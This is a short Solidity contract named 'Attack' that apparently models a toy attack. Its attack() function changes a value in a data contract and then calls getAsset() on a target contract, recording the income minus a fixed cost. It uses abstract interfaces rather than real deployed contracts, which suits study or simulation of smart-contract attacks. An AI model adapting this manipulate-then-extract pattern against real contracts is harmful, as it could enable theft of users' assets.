// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import {IData} from "../interfaces/IData.sol";
import {IBeAttacked} from "../interfaces/IBeAttacked.sol";

contract Attack {

    address public data_contract;
    address public be_attacked_contract;

    uint public income;

    constructor(address _data_contract, address _be_attacked_contract) {
        data_contract = _data_contract;
        be_attacked_contract = _be_attacked_contract;
    }

    function attack() external {
        uint attack_cost = 4;
        IData(data_contract).changeDataFunction(6);
        uint attack_income = IBeAttacked(be_attacked_contract).getAsset();
        income = attack_income - attack_cost;
    }
}